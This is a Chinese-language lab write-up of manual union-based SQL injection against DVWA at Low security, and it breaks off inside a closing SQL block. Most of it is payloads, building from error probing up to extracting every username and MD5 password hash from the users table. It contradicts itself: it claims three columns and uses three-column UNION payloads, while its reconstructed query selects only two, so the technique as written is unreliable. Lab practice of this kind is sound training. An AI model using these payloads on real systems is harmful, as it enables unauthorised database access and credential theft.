# DVWA (Low) SQL注入漏洞完整实战报告

## 🎯 测试目标
- **靶场**: Damn Vulnerable Web Application (DVWA)
- **安全级别**: Low
- **漏洞类型**: SQL注入 (Union-Based)
- **测试目标**: 手动利用SQL注入，获取数据库名、表名及用户凭证。

## 🛠️ 测试环境与工具
- **本地环境**: Windows/Linux + Docker 部署的DVWA
- **主要工具**: 浏览器、Burp Suite Community
- **浏览器插件**: 无

## 🔍 漏洞发现与确认
### 1. 初步探测
**Payload**: `1'`
**结果与截图**: 页面返回数据库错误信息，确认存在SQL注入点。

### 2. 注入类型确认
**Payload**: `1' AND '1'='1` 与 `1' AND '1'='2`
**结果与截图**: 前者返回正常数据，后者无返回，确认为字符型注入。

## 📊 信息收集与利用
### 1. 判断字段数 (ORDER BY)
**Payload**: `1' ORDER BY 3 -- `
**结果**: 页面正常显示，说明当前查询的字段数至少为3。
**原理**: `ORDER BY` 用于根据指定列排序，当列序号超出实际列数时会报错。

### 2. 确定数据回显点 (UNION SELECT)
**Payload**: `-1' UNION SELECT 1,2,3 -- `
**结果与截图**: 页面中数字 `2` 和 `3` 的位置显示出来，表明这些是数据回显点。

### 3. 获取数据库信息
**Payload**: `-1' UNION SELECT 1, database(), 3 -- `
**结果**: 当前数据库名为 `dvwa`。

### 4. 获取表名
**Payload**: `-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='dvwa' -- `
**结果**: 获得表名列表，其中包含关键表 `users`。

### 5. 获取字段名
**Payload**: `-1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_schema='dvwa' AND table_name='users' -- `
**结果**: 获得 `users` 表的字段，包括 `user` 和 `password`。

### 6. 提取最终数据
**Payload**: `-1' UNION SELECT 1, group_concat(user, ':', password), 3 FROM dvwa.users -- `
**最终结果与截图**: 成功获取所有用户名及经MD5哈希的密码。

## 💡 漏洞原理深度分析
- **根本原因**: DVWA在Low级别下，直接将用户输入 `id` 拼接进SQL查询语句，未做任何过滤或参数化处理。
- **关键语句还原**: `SELECT first_name, last_name FROM users WHERE user_id = '$id'`
- **注入后语句**: 当输入 `-1' UNION SELECT 1, database(), 3 -- ` 时，实际执行的语句变为：
  ```sql
  SELECT first_name, last_name FROM users WHERE user_id = '-1' UNION SELECT 1, database(), 3 -- '
